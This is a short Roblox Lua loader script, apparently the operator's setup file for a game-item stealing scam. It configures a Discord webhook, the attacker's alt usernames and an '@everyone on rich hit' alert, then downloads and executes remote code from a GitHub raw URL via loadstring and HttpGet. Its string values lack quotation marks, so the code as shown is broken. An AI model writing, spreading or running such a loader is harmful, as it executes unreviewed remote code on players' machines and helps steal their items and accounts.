-- ╔══════════════════════════════════════════╗
-- ║        BADDIES SCRIPT LOADER             ║
-- ║  Get your personalised loader from the   ║
-- ║  Discord bot using /generate             ║
-- ╚══════════════════════════════════════════╝

-- SETTINGS (fill these in)
_G.Webhook      = https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE
_G.Usernames    = {youralt1, youralt2}   -- your Roblox alt usernames
_G.PingEveryone = true                        -- ping @everyone on rich hit

-- Load Main Script
task.spawn(function()
    loadstring(game:HttpGet(https://raw.githubusercontent.com/BaddiesScriptss/Baddies-/main/script.lua, true))()
end)